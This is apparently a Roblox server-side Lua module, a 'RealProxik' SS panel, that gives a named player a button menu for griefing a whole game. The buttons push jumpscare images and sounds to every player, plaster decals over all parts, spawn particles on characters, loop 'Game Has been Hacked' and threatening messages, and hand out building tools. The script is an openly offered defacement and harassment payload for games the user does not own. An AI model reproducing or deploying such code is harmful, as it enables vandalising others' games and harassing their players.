local RealProxikModule = {}

function RealProxikModule.Load(senderName)
    local player = game.Players:FindFirstChild(senderName)
    if not player then return end

    -- GUI Creation
    local sg = Instance.new("ScreenGui", player.PlayerGui)
    sg.Name = "RealProxik_SS_Panel"
    
    local main = Instance.new("Frame", sg)
    main.Size = UDim2.new(0, 200, 0, 350)
    main.Position = UDim2.new(0.1, 0, 0.3, 0)
    main.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    
    local list = Instance.new("UIListLayout", main)
    list.Padding = UDim.new(0, 5)

    local function CreateBtn(name, callback)
        local b = Instance.new("TextButton", main)
        b.Size = UDim2.new(1, 0, 0, 30)
        b.Text = name
        b.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
        b.TextColor3 = Color3.new(1, 1, 1)
        b.MouseButton1Click:Connect(callback)
    end

    -- 1. Jumpscare
    CreateBtn("JUMPSCARE", function()
        for _, p in pairs(game.Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui", p.PlayerGui)
            local img = Instance.new("ImageLabel", gui)
            img.Size = UDim2.new(1, 0, 1, 0)
            img.Image = "rbxassetid://107618093294376"
            local s = Instance.new("Sound", workspace)
            s.SoundId = "rbxassetid://107618093294376"
            s:Play()
            task.delay(3, function() gui:Destroy() end)
        end
    end)

    -- 2. Jumpstyle (Music)
    CreateBtn("JUMPSTYLE", function()
        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://1839246711"
        s.Looped = true
        s:Play()
    end)

    -- 3. Anonymous Decal Map
    CreateBtn("DECAL ALL", function()
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                local d = Instance.new("Decal", v)
                d.Texture = "rbxassetid://130753452917988"
                d.Face = "All"
            end
        end
    end)

    -- 4. Particles
    CreateBtn("PARTICLES", function()
        for _, p in pairs(game.Players:GetPlayers()) do
            if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                local pe = Instance.new("ParticleEmitter", p.Character.HumanoidRootPart)
                pe.Texture = "rbxassetid://86655328150970"
            end
        end
    end)

    -- 5. Message Loop
    CreateBtn("MSG LOOP", function()
        task.spawn(function()
            while task.wait(5) do
                local m = Instance.new("Message", workspace)
                m.Text = "Game Has been Hacked by realProxik."
                task.wait(3)
                m.Text = "you can't escape from Me!?!?!?!?"
                task.wait(3)
                m:Destroy()
            end
        end)
    end)

    -- 6. Hint
    CreateBtn("HINT", function()
        local h = Instance.new("Hint", workspace)
        h.Text = "Lol Game Has Been Hacked By team realProxik"
    end)

    -- 7. BTools (F3X or Classic)
    CreateBtn("GIVE BTOOLS", function()
        local tool = Instance.new("HopperBin", player.Backpack)
        tool.BinType = "Hammer"
        local tool2 = Instance.new("HopperBin", player.Backpack)
        tool2.BinType = "Clone"
        local tool3 = Instance.new("HopperBin", player.Backpack)
        tool3.BinType = "Grab"
    end)
end

return RealProxikModule
